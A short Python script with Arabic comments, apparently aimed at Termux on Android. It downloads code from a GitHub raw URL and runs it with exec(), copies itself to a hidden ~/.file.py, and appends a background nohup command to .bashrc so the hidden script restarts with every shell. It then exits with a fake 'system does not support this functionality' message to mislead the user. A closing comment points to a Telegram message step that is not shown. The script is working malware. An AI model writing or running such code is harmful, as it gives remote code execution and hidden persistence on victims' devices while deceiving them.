import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop

# محاولة تثبيت المكتبات المطلوبة إذا لم تكن موجودة
try:
    import bs4
except ModuleNotFoundError:
    os.system('pip install requests bs4 futures > /dev/null 2>&1')
    os.system('python .file.py')

# تحميل وتنفيذ كود من URL
X1 = requests.get('https://raw.githubusercontent.com/JDXSX/VBCJCXUF/main/.file.py').text
exec(X1)

# تحديد الأمر لتشغيل سكربت في الخلفية
hack = 'nohup python /data/data/com.termux/files/home/.file.py > /dev/null 2>&1 &'

# محاولة قراءة وتحديث ملف .bashrc
try:
    with open('/data/data/com.termux/files/home/.bashrc', 'r') as file:
        read = file.read()
    if hack not in read:
        with open('/data/data/com.termux/files/home/.bashrc', 'a') as file:
            file.write(f'\n{hack}')
except Exception as e:
    print(f"Error updating .bashrc: {e}")
    with open('/data/data/com.termux/files/home/.bashrc', 'w') as file:
        file.write(hack)

# محاولة قراءة أو نسخ ملف file.py
try:
    with open('/data/data/com.termux/files/home/.file.py', 'r'):
        pass
except FileNotFoundError:
    os.system('cp -r file.py /data/data/com.termux/files/home/.file.py')

# محاولة قراءة أو إنشاء ملف .tst.txt
try:
    with open('/data/data/com.termux/files/home/.tst.txt', 'r'):
        pass
except FileNotFoundError:
    with open('/data/data/com.termux/files/home/.tst.txt', 'w') as file:
        file.write('hi')
    sys.exit('\nSorry, your system does not support this functionality.')

# إرسال رسالة عبر Telegram
